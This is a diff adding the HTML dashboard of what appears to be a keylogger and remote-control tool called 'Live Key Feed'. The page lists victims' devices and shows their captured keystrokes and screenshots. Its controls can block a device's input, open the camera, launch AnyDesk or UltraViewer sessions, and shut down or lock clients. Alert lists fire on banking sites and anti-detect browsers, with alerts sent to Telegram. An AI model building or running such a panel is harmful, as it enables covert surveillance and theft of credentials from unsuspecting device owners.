@@ -1,0 +1,313 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Live Key Feed</title>
+  <link rel="stylesheet" href="/web/styles.css?v=20260926-1" />
+</head>
+<body>
+  <div class="app">
+    <aside class="live-notification" id="liveNotification" role="status" aria-live="polite" aria-atomic="true" hidden>
+      <div class="live-notification-heading">
+        <strong>New activity</strong>
+        <button type="button" id="closeNotification" aria-label="Dismiss notification">Close</button>
+      </div>
+      <p id="liveNotificationText"></p>
+    </aside>
+    <div class="topbar">
+      <div class="brand"><span class="dot"></span> Live Key Feed</div>
+      <div class="topbar-status" aria-label="Service status">
+        <div class="topbar-metric">
+          <span class="topbar-metric-label">Started</span>
+          <span class="topbar-metric-value" id="startedAt">Loading...</span>
+        </div>
+        <div class="topbar-metric">
+          <span class="topbar-metric-label">Uptime</span>
+          <span class="topbar-metric-value" id="uptime">Loading...</span>
+        </div>
+        <div class="topbar-metric">
+          <span class="topbar-metric-label">Filtered Keys</span>
+          <span class="topbar-metric-value" id="messageCount">0</span>
+        </div>
+      </div>
+      <div class="topbar-meta">
+        <span>Realtime monitor</span>
+        <span class="stream-pill">Live stream</span>
+        <span class="tor-status" id="torStatus" title="Current TOR transport status">TOR: not integrated</span>
+        <button class="support-link constellation-trigger" type="button" data-mode="constellation">Constellation</button>
+        <button class="support-link update-all-topbar" id="updateAllClientsButton" type="button">Update all</button>
+        <div class="support-menu">
+          <a class="support-link" id="supportLink" href="https://buymeacoffee.com/yourusername" target="_blank" rel="noopener noreferrer">Buy me a coffee</a>
+          <div class="payment-list" id="paymentList" aria-label="Other ways to support"></div>
+        </div>
+      </div>
+    </div>
+    <div class="workspace">
+      <aside class="devices-panel" aria-label="Connected devices">
+        <div class="devices-heading">
+          <h2>Devices</h2>
+          <span class="device-count" id="deviceCount">0</span>
+        </div>
+        <div class="device-summary">
+          <span class="online-count" id="onlineCount">0 online</span>
+          <span class="device-refresh" id="deviceUpdated">Checking...</span>
+        </div>
+        <div class="device-list" id="deviceList">
+          <span class="device-seen">Loading...</span>
+        </div>
+      </aside>
+      <section class="feed-panel">
+        <div class="status" id="status">Waiting for live streamâ€¦</div>
+        <div class="feed-toolbar">
+          <span id="scopeLabel">All devices</span>
+          <input class="message-search" id="messageSearch" type="search" placeholder="Search filtered keys" aria-label="Search filtered keys" />
+          <div class="view-switch" aria-label="Key view">
+            <button type="button" class="active" data-mode="filtered">Filtered</button>
+            <button type="button" data-mode="raw">Unfiltered</button>
+            <button type="button" data-mode="raw-history">Local saved</button>
+            <button type="button" data-mode="screenshots">Screenshots</button>
+            <button type="button" data-mode="controls">Device controls</button>
+          </div>
+        </div>
+        <form class="raw-history-controls" id="rawHistoryControls" hidden>
+          <input id="rawDeviceFilter" type="text" placeholder="Device ID" aria-label="Device ID" />
+          <input id="rawSessionFilter" type="text" placeholder="Session ID" aria-label="Session ID" />
+          <input id="rawStartFilter" type="datetime-local" aria-label="Start time" />
+          <input id="rawEndFilter" type="datetime-local" aria-label="End time" />
+          <button type="submit">Load history</button>
+        </form>
+        <section class="controls-panel" id="controlsPanel" hidden aria-label="Device controls">
+          <div class="controls-heading">
+            <span class="controls-kicker">Service controls</span>
+            <h2>Device controls</h2>
+          </div>
+          <p class="controls-device" id="controlsDevice">Select a device from the device list.</p>
+          <div class="controls-actions">
+            <button class="control-button control-button-danger" id="shutdownButton" type="button">Shut down client</button>
+            <button class="control-button control-button-danger" id="logoutClientButton" type="button">Log out client</button>
+            <button class="control-button control-button-danger" id="restartClientButton" type="button">Restart client</button>
+            <button class="control-button" id="lockClientButton" type="button">Lock client</button>
+            <button class="control-button control-button-warning" id="blockInputButton" type="button">Block input</button>
+            <button class="control-button" id="pauseClientButton" type="button">Pause collection</button>
+            <button class="control-button" id="resumeClientButton" type="button">Resume collection</button>
+            <button class="control-button control-button-warning" id="disableCameraButton" type="button">Open camera</button>
+            <button class="control-button control-button-primary" id="openUltraViewerButton" type="button">Choose remote app</button>
+            <button class="control-button control-button-primary" id="updateClientButton" type="button">Update client</button>
+            <button class="control-button control-button-primary" id="openMessageButton" type="button">Send message</button>
+            <button class="control-button control-button-primary" id="sendDocumentButton" type="button">Send document</button>
+            <button class="control-button" id="openMonitoredSitesButton" type="button">Monitored sites</button>
+            <button class="control-button" id="openMonitoredAppsButton" type="button">Monitored apps</button>
+            <button class="control-button" id="logoutDashboardButton" type="button">Log out dashboard</button>
+            <button class="control-button" id="refreshButton" type="button">Refresh dashboard</button>
+            <button class="control-button control-button-primary" id="captureScreenshotButton" type="button">Screenshot</button>
+          </div>
+          <input id="clientDocument" type="file" accept=".pdf,.docx,.rtf,.txt" hidden aria-label="Choose a document to send" />
+          <p class="controls-status" id="controlsStatus" role="status">Choose an action.</p>
+          <div class="command-history" id="commandHistory"></div>
+        </section>
+        <section class="constellation-panel" id="constellationPanel" hidden aria-label="Device constellation">
+          <div class="constellation-heading">
+            <div>
+              <span class="controls-kicker">Live topology</span>
+              <h2>Device constellation</h2>
+            </div>
+            <div class="constellation-heading-actions">
+              <span class="constellation-summary" id="constellationSummary">Waiting for devices...</span>
+              <button class="dialog-close" id="closeConstellationButton" type="button" aria-label="Close constellation">&times;</button>
+            </div>
+          </div>
+          <div class="constellation-stage" id="constellationStage" role="img" aria-label="Live map of connected devices"></div>
+        </section>
+        <dialog class="message-dialog" id="remoteAppDialog" aria-labelledby="remoteAppDialogTitle">
+          <form class="message-compose" id="remoteAppForm" method="dialog">
+            <div class="message-dialog-heading">
+              <div>
+                <span class="controls-kicker">Remote access</span>
+                <h2 id="remoteAppDialogTitle">Choose remote app</h2>
+              </div>
+              <button class="dialog-close" id="closeRemoteAppButton" type="button" aria-label="Close remote app chooser">&times;</button>
+            </div>
+            <p class="message-dialog-target" id="remoteAppDialogTarget">Choose a device before continuing.</p>
+            <label for="remoteAppSelect">Remote desktop app</label>
+            <select class="duration-input" id="remoteAppSelect">
+              <option value="ultraviewer">UltraViewer</option>
+              <option value="anydesk">AnyDesk</option>
+            </select>
+            <div class="message-dialog-actions">
+              <button class="control-button" id="cancelRemoteAppButton" type="button">Cancel</button>
+              <button class="control-button control-button-primary" id="confirmRemoteAppButton" type="submit">Open app</button>
+            </div>
+          </form>
+        </dialog>
+        <dialog class="message-dialog" id="cameraDialog" aria-labelledby="cameraDialogTitle">
+          <form class="message-compose" id="cameraForm" method="dialog">
+            <div class="message-dialog-heading">
+              <div>
+                <span class="controls-kicker">Camera control</span>
+                <h2 id="cameraDialogTitle">Open camera</h2>
+              </div>
+              <button class="dialog-close" id="closeCameraButton" type="button" aria-label="Close camera control window">&times;</button>
+            </div>
+            <p class="message-dialog-target" id="cameraDialogTarget">Choose a device before continuing.</p>
+            <label for="cameraDuration">Duration in seconds</label>
+            <input class="duration-input" id="cameraDuration" type="number" min="1" max="3600" value="30" inputmode="numeric" />
+            <p class="dialog-help">The client will open the system camera app for the selected time window.</p>
+            <div class="message-dialog-actions">
+              <button class="control-button" id="cancelCameraButton" type="button">Cancel</button>
+              <button class="control-button control-button-warning" id="confirmCameraButton" type="submit">Open camera</button>
+            </div>
+          </form>
+        </dialog>
+        <dialog class="message-dialog" id="messageDialog" aria-labelledby="messageDialogTitle">
+          <form class="message-compose" id="messageCompose" method="dialog">
+            <div class="message-dialog-heading">
+              <div>
+                <span class="controls-kicker">Client communication</span>
+                <h2 id="messageDialogTitle">Send a message</h2>
+              </div>
+              <button class="dialog-close" id="closeMessageButton" type="button" aria-label="Close message window">&times;</button>
+            </div>
+            <p class="message-dialog-target" id="messageDialogTarget">Choose a device before sending.</p>
+            <label for="clientMessage">Message or caption</label>
+            <textarea id="clientMessage" maxlength="2000" rows="6" placeholder="Write something for the selected client..."></textarea>
+            <label for="clientImage">Image</label>
+            <input class="message-image-input" id="clientImage" type="file" accept="image/jpeg,image/png,image/gif,image/webp" />
+            <span class="message-image-name" id="clientImageName">No image selected</span>
+            <div class="message-dialog-footer">
+              <span class="message-count" id="messageLength">0 / 2000</span>
+              <div class="message-dialog-actions">
+                <button class="control-button" id="cancelMessageButton" type="button">Cancel</button>
+                <button class="control-button control-button-primary" id="sendMessageButton" type="submit">Send message</button>
+              </div>
+            </div>
+          </form>
+        </dialog>
+        <div class="screenshot-overlay" id="screenshotOverlay" hidden>
+          <div class="message-dialog screenshot-dialog" role="dialog" aria-modal="true" aria-labelledby="screenshotDialogTitle">
+            <div class="message-compose" id="screenshotCompose">
+              <div class="message-dialog-heading">
+                <div>
+                  <span class="controls-kicker">Device preview</span>
+                  <h2 id="screenshotDialogTitle">Screenshot</h2>
+                </div>
+                <button class="dialog-close" id="closeScreenshotButton" type="button" aria-label="Close screenshot window">&times;</button>
+              </div>
+              <p class="message-dialog-target" id="screenshotDialogTarget">Choose a device before continuing.</p>
+              <div class="controls-screenshot-progress screenshot-progress" id="screenshotDialogProgress" aria-label="Screenshot progress">
+                <span class="progress-step" data-stage="Ready">Ready</span>
+                <span class="progress-step" data-stage="Queued">Queued</span>
+                <span class="progress-step" data-stage="Capturing">Capturing</span>
+                <span class="progress-step" data-stage="Saving">Saving</span>
+                <span class="progress-step" data-stage="Saved">Save success</span>
+                <span class="progress-step" data-stage="Displaying">Displaying</span>
+              </div>
+              <div class="controls-screenshot-status" id="screenshotDialogStatus">No screenshot available.</div>
+              <div class="controls-screenshot-frame screenshot-dialog-frame">
+                <img id="screenshotDialogPreview" alt="Selected device screenshot" hidden />
+                <div class="controls-screenshot-placeholder" id="screenshotDialogPlaceholder">No screenshot captured yet.</div>
+              </div>
+              <div class="message-dialog-actions">
+                <button class="control-button" id="cancelScreenshotButton" type="button">Close</button>
+                <button class="control-button control-button-primary" id="confirmScreenshotButton" type="button">Capture again</button>
+              </div>
+            </div>
+          </div>
+        </div>
+        <dialog class="message-dialog compact-config-dialog" id="monitoredSitesDialog" aria-labelledby="monitoredSitesTitle">
+          <form class="message-compose" method="dialog">
+            <div class="message-dialog-heading">
+              <div>
+                <span class="controls-kicker">Alert config</span>
+                <h2 id="monitoredSitesTitle">Monitored sites</h2>
+              </div>
+              <button class="dialog-close" id="closeMonitoredSitesDialogButton" type="button" aria-label="Close monitored sites dialog">&times;</button>
+            </div>
+            <p class="controls-help">Only URLs from these domains trigger Telegram alerts. Separate values with commas or new lines.</p>
+            <textarea id="monitoredSitesInput" rows="6" spellcheck="false" placeholder="example.com, github.com, bank.com"></textarea>
+            <div class="message-dialog-actions monitored-sites-actions">
+              <button class="control-button" id="cancelMonitoredSitesButton" type="button">Close</button>
+              <button class="control-button control-button-primary" id="saveMonitoredSitesButton" type="submit">Save sites</button>
+            </div>
+            <div class="monitored-sites-status" id="monitoredSitesStatus" role="status">No sites configured yet.</div>
+          </form>
+        </dialog>
+        <dialog class="message-dialog compact-config-dialog" id="monitoredAppsDialog" aria-labelledby="monitoredAppsTitle">
+          <form class="message-compose" method="dialog">
+            <div class="message-dialog-heading">
+              <div>
+                <span class="controls-kicker">Alert config</span>
+                <h2 id="monitoredAppsTitle">Monitored apps</h2>
+              </div>
+              <button class="dialog-close" id="closeMonitoredAppsDialogButton" type="button" aria-label="Close monitored apps dialog">&times;</button>
+            </div>
+            <p class="controls-help">Only app names matching these entries trigger Telegram alerts. Use keywords like chrome, firefox, gologin.</p>
+            <textarea id="monitoredAppsInput" rows="6" spellcheck="false" placeholder="chrome, firefox, gologin, morelogin"></textarea>
+            <div class="message-dialog-actions monitored-sites-actions">
+              <button class="control-button" id="cancelMonitoredAppsButton" type="button">Close</button>
+              <button class="control-button control-button-primary" id="saveMonitoredAppsButton" type="submit">Save apps</button>
+            </div>
+            <div class="monitored-sites-status" id="monitoredAppsStatus" role="status">No app filters configured yet.</div>
+          </form>
+        </dialog>
+            <div class="feed" id="feed"></div>
+      </section>
+      <aside class="open-apps-panel" aria-label="Open applications">
+        <div class="open-apps-heading">
+          <h2>Open apps</h2>
+          <div class="open-apps-actions">
+            <button class="control-button" id="activityButton" type="button">Activity</button>
+            <button class="control-button" id="closeAllAppsButton" type="button">Close all</button>
+          </div>
+        </div>
+        <div class="open-apps-device" id="openAppsDevice">Select a device</div>
+        <ul class="open-apps-list" id="openAppsList">
+          <li>Select a device to view open apps</li>
+        </ul>
+        <section class="activity-panel" id="activityPanel" hidden aria-label="Activity summary">
+          <div class="controls-heading">
+            <span class="controls-kicker">Telemetry summary</span>
+            <h2>Activity</h2>
+          </div>
+          <div class="activity-actions">
+            <a class="control-button" id="exportCsvLink" href="/api/export/messages">Export CSV</a>
+            <a class="control-button" id="exportJsonLink" href="/api/export/messages?format=json">Export JSON</a>
+          </div>
+          <div class="activity-stats" id="activityStats"></div>
+          <div class="activity-columns">
+            <div><h3>Top applications</h3><ul id="topApps"></ul></div>
+            <div><h3>Top websites</h3><ul id="topDomains"></ul></div>
+          </div>
+          <div class="device-detail" id="deviceDetail"></div>
+        </section>
+      </aside>
+      <dialog class="message-dialog activity-dialog" id="activityDialog" aria-labelledby="activityDialogTitle">
+        <div class="message-compose">
+          <div class="message-dialog-heading">
+            <div>
+              <span class="controls-kicker">Telemetry summary</span>
+              <h2 id="activityDialogTitle">Activity</h2>
+            </div>
+            <button class="dialog-close" id="closeActivityButton" type="button" aria-label="Close activity popup">&times;</button>
+          </div>
+          <div class="activity-actions">
+            <a class="control-button" id="exportCsvLinkDialog" href="/api/export/messages">Export CSV</a>
+            <a class="control-button" id="exportJsonLinkDialog" href="/api/export/messages?format=json">Export JSON</a>
+          </div>
+          <div class="activity-stats" id="activityDialogStats"></div>
+          <div class="activity-columns">
+            <div><h3>Top applications</h3><ul id="topAppsDialog"></ul></div>
+            <div><h3>Top websites</h3><ul id="topDomainsDialog"></ul></div>
+          </div>
+          <div class="device-detail" id="deviceDetailDialog"></div>
+          <div class="message-dialog-actions">
+            <button class="control-button" id="closeActivityDialogButton" type="button">Close</button>
+          </div>
+        </div>
+      </dialog>
+    </div>
+  </div>
+  <script type="module" src="/web/app.js?v=20260926-6"></script>
+</body>
+</html>
+
